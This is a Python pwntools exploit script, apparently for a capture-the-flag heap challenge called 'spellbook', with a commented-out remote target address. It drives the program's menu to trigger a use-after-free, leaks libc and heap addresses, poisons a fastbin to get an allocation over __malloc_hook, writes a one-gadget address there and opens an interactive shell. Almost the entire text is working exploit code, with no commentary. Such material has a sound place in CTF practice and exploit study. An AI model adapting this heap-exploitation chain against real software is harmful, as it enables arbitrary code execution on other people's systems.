from pwn import *

target = process('./spellbook')

#pid = gdb.attach(target, "\nb *show+170\nb *delete+160\nb *add+318\nb *add+102\nb *edit+186\nb *edit+248\n set disassembly-flavor intel\ncontinue")

#target = remote('167.99.206.87', 30567)

libc = ELF('glibc/libc.so.6')

def add(index, type, power, power_content):
    
    print(target.recvuntil(b'4. Delete'))
    target.sendline(b'1')
    
    print(target.recvuntil(b's entry:'))
    target.sendline(str(index))
    print(target.recvuntil(b's type:'))
    target.send(type)
    print(target.recvuntil(b'power:'))
    target.sendline(str(power))
    print(target.recvuntil(b'Enter'))
    target.send(power_content)

def show(index):
    print(target.recvuntil(b'4. Delete'))
    target.sendline(b'2')
    
    print(target.recvuntil(b's entry:'))
    target.sendline(str(index))
    
    
def edit(index, type, power_content):
    
    print(target.recvuntil(b'4. Delete'))
    target.sendline(b'3')
    
    print(target.recvuntil(b's entry:'))
    target.sendline(str(index))
    print(target.recvuntil(b's type:'))
    target.sendline(type)
    print(target.recvuntil(b'New'))
    target.sendline(power_content)
    
def delete(index):
    print(target.recvuntil(b'4. Delete'))
    target.sendline(b'4')
    
    print(target.recvuntil(b's entry:'))
    target.sendline(str(index))
'''
add(1, b'a' * 0x17, 0x60, b'b' * (0x60-1))
add(2, b'c' * 0x17, 0x60, b'd' * (0x60-1))
add(3, b'e' * 0x17, 0x60, b'f' * (0x60-1))
delete(1)
delete(2)
delete(3)
edit(3, 
target.interactive()
'''


add(1, b'a' * 0x17, 0x100, b'b' * (0x100-1))
add(2, b'c' * 0x17, 0x60, b'd' * (0x60-1))
add(3, b'c' * 0x17, 0x60, b'd' * (0x60-1))

delete(1)
show(1)
print(target.recvuntil(b'type:'))
print(target.recvuntil(b': '))
leak = target.recv(6)
free_libc = u64(leak + b'\x00' * 2) - 0x340638
print(hex(free_libc))



libc_base = free_libc - libc.symbols['free']
execve = libc_base + libc.symbols['execve']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
onegadget = libc_base + 0x4527a
print(hex(onegadget))
print(hex(malloc_hook))

delete(3)
delete(2)
show(2)


print(target.recvuntil(b'type:'))
print(target.recvuntil(b': '))

leak = target.recv(6)
heap_leak = u64(leak+b'\x00' * 2)
print(hex(heap_leak))

edit(2, p64(heap_leak-0x210), p64(malloc_hook-0x23))



add(4, b'e' * 0x17, 0x60, cyclic(0x60-1))
add(5, b'f' * 0x17, 0x60, b'a' * 19 + p64(onegadget))

print(target.recvuntil(b'4. Delete'))
target.sendline(b'1')

print(target.recvuntil(b's entry:'))
target.sendline(b'6')

target.interactive()